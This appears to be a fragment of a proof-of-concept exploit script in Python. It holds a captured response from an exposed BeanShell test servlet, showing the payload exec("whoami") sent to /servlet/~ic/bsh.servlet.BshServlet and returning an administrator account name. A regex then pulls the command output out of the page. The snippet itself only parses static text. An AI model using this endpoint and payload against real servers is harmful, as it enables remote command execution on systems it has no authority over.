import re

data = """
<html>
<head><title>BeanShell Test Servlet</title></head>
<body>

<h1>BeanShell Test Servlet</h1>
BeanShell version: 2.0b1.1

<h2>Script Output</h2>
<table width="80%" border="1" cellpadding="6"><tr><td bgcolor="#eeeeee">
<pre>
oa\\administrator

</pre>
</td></tr></table>

<h2>Script Return Value</h2>
<pre>
null
</pre>
</p>


<h2>Script</h2>
<form method="POST" action="/servlet/~ic/bsh.servlet.BshServlet">
<TEXTAREA name="bsh.script" rows="10" cols="80">
exec("whoami")

</TEXTAREA>
<p>
Capture Stdout/Stderr:
<INPUT type="checkbox"  name="bsh.servlet.captureOutErr" value="true">
Display Raw Output:
<INPUT type="checkbox" name="bsh.servlet.output" value="raw">
<p>
<INPUT type="submit" value="Evaluate">
</form>
/test/
</body>
<html>
"""
# print(data)
com = re.compile(r'<td bgcolor="#eeeeee">(?P<exec_res>.*?)</td>',re.S)
res = com.search(data).group("exec_res")
res = re.sub(r'<.*>', "", res).strip()
print(res)